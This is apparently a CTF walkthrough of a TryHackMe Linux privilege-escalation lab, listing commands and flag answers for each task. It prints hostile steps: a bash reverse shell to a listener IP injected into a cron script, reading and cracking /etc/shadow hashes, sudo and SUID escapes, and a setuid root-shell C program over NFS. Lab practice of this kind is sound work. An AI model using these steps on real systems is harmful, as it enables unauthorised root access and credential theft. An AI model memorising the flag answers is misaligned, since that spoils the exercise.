# Linux PrivEsc
# 29-05-2022
# little human
# level : medium




## Enumeration

> Machine IP : 10.10.205.212
> SSH credential `username : karen` and `password : Password1`


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the hostname of the target system ? | wade7363 |
| What is the Linux kernel verion of the target system ? | 3.13.0-24-generic |
| What Linux is this ? | Ubuntu 14.04 LTS |
| What version of the python language is installed on the system ? | 2.7.6 |
| What vulnerability seem to affect the kernel of the target system ? (Enter a CVE number) | CVE-2015-1328 |


## Automated Enumeration Tools

> Link of some automated enumeration tools

| Tool Name | Link |
| LinPeas | https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS |
| LinEnum | https://github.com/rebootuser/LinEnum |
| Linux Exploit Suggester (LES) | https://github.com/mzet-/linux-exploit-suggester |
| Linux Smart Enumeration | https://github.com/diego-treitos/linux-smart-enumeration |
| Linux Priv Checker | https://github.com/linted/linuxprivchecker |



## Privilege Escalation : Kernel Exploits

> Machine IP : `10.10.120.163`

### The Exploit file is  `37292.c`

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the content of the flag1.txt file ? | THM-28392872729920 |


## Privilege Escalation Sudo

> Machine IP : `10.10.49.30`


> finding sudo rights 
```
sudo -l
```
> finding flag2.txt
```
find / -type f -name flag2.txt 2>/dev/null
```
> privilege excalation using less
```
sudo less /etc/passwd
!/bin/bash -i
```

> getting frank's password hash (run as root)
```
cat /etc/shadow | grep frank | cut -d ":" -f 2
```


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How many programs can the user "karen" run on the target system with sudo rights ? | 3 |
| What is the content of the flag2.txt file ? | THM-402028394 |
| How would you use Nmap to spawn a root shell if your user had sudo rights on nmap ? | sudo nmap --interactive |
| What is the hash of frank's password ? | $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1 |



## Privilege Escalation : SUID 

> Machine IP : `10.10.102.137`

> finding all the files with SUID bit set
```
find / -type f -perm -04000 -ls 2>/dev/null
```

> using the base64 SUID set bit we can read /etc/shadow file
```
base64 /etc/shadow | base64 --decode

```

> extract user2's password hash from /etc/shadow
```
base64 /etc/shadow | base64 --decode | grep user2 |cut -d ":" -f 2
```

> reading the flag3.txt file using base64
```
base64 /home/ubuntu/flag3.txt | base64 --decode
```


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| Which user shares the name of a great comic book writer ? | gerryconway |
| What is the password of user2 ? | Password1 |
| What is the content of the flag3.txt file ? | THM-3847834 |


## Privilege Escalation : Capabilities

> Machine IP : `10.10.93.55`

> finding the set capabilities 
```
getcap -r / 2>/dev/null
```
> finding the flag4.txt
```
find / -type f -name flag4.txt 2>/dev/null
```
> reading the flag4.txt 
```
/home/karen/vim /home/ubuntu/flag4.txt
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How many binaries have set capabilities ? | 6 |
| What other binary can be used through its capabillities ? | view |
| What is the content of the flag4.txt file ? | THM-9349843 |


## Privilege Escalation : Cron Jobs

> Machine IP : `10.10.215.9`

> reading the crontab 
```
cat /etc/crontab

```

### If the full path of the script is not defined (as it was done for the backup.sh script), cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script named “antivirus.sh” under our user’s home folder and it should be run by the cron job.


> add the following file into the `backup.sh` (replace the ip with your local machine vpn ip
```
bash -i >& /dev/tcp/10.17.48.110/4444 0>&1

cp /home/ubuntu/flag5.txt /home/karen/
chmod +r /home/karen/flag5.txt

```
> now make the `backup.sh` executable
```
chmod +x backup.sh
```

> start a netcat listener into your local machine and wait for sometime.
```
nc -lvnp 4444
```

> after getting a root shell into the netcat finding Matt's password hash 
```
cat /etc/shadow | grep matt | cut -d ":" -f 2
```
> now save the hash and use hashcat for cracking the password 
```
hashcat -m 1800 hash.txt /usr/share/wordlist/rockyou.txt
```

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How many user-defined cron jobs can you see on the target system ? | 4 |
| What is the content of the flag5.txt file ? | THM-383000283 |
| What is Matt's password | 123456 |


## Privilege Escalation : PATH

> Machine IP : `10.10.221.238`

> finding the folder with write access 
```
find /home -type d -writable 2>/dev/null
```
> goto that folder and create a file called `thm` with the following code
```
cat /home/matt/flag6.txt
```
> now edit the PATH env variable with the following 
```
PATH=/home/murdoch:$PATH
export $PATH
```
> now just run the `test` file 
```
./test
```


| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the odd folder you have write access for ? | /home/murdoch |
| What is the content of the flag6.txt file ? | THM-736628929 |


## Privilege Escalation : NFS

> Machine IP : `10.10.218.100`

### NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

> from our attack machine we will first check the mountpoints
```
showmount -e 10.10.218.100
```
> now mount any of the endpoint to our local machine
```
sudo mkdir /tmp/nfs
sudo mount -O rw 10.10.218.100:/home/ubuntu/sharedfolder /tmp/nfs
```
> after mounting just go to the `/tmp/nfs` folder of our local machine. and create a `exploit.c` file with the following code.
```
#include<unistd.h>
int main()
{
 setgid(0);
 setuid(0);
 system("/bin/bash");
 return 0;
}

```
> now compile the code from local machine 
```
sudo gcc exploit.c -o exploit -w

```

> now set the `SUID` bit on the binary so that we can run it from the vm .
```
sudo chmod +sx exploit
```

> now from the vm just run the `exploit` binary and we will get a root shell.

> find the `flag7.txt`
```
find / -type f -name flag7.txt 2>/dev/null
```



| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| How many mountable shared can you identify on the target system ? | 3 |
| How many shares have the "no_root_squash" option enabled ? | 3 |
| What is the content of the flag7.txt file ? | THM-89384012 |


## Capstone Challenge

> Machine IP : `10.10.126.223`

> lets see how many users are there
```
cat /etc/passwd | grep home

```
> so there are 2 users except root.

> finding the `SUID` set binary files
```
find / -type f -perm -04000 -user root 2>/dev/null

```
> findidng the flags
```
find / -type f -name flag* 2>/dev/null
```

> we can see that `base64` binary is enabled with `SUID` bit. lets read the shadow file and obtain the password hashed 
```
base64 /etc/shadow | base64 --decode | cut -d ":" -f 1,2

```

> lets first crack `missy` user's password using hashcat
```

hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt

```
> so now we got missy's password. lets login as missy
```
su missy
```
> now find the flags
```
find / -type f -name flag* 2>/dev/null
```
> we have got the flag1.txt file. read it and submit the flag.

> now lets try to read the flag2.txt which probably in the rootflag folder. but we have no access to go there. we will use `base64` binary to read if any flag is there.
```
base64 /home/rootflag/flag2.txt | base64 --decode 
```

> so now we have the flag2.txt




| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| What is the content of the flag1.txt file ? | THM-42828719920544 |
| What is the content of the flag2.txt file ? | THM-168824782390238 |





#        THE END 
